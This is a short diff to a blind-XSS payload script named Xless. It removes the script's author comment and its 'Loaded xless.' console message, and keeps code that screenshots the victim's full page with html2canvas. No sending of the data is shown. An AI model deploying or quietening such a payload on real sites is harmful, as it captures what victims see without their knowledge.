@@ -1,7 +1,3 @@
-// Xless: The serverlesss Blind XSS app.
-// Author: Mazin Ahmed <mazin@mazinahmed.net>
-
-console.log("Loaded xless.");
 var collected_data = {};
 
 var curScript = document.currentScript;
@@ -13,7 +9,7 @@ function return_value(value) {
 function screenshot() {
   return new Promise(function (resolve, reject) {
     html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true, width: 1024, height: 768}).then(function (canvas) {
-        resolve(return_value(canvas.toDataURL())) // png in dataURL format
+        resolve(return_value(canvas.toDataURL()))
     });
   });
 }
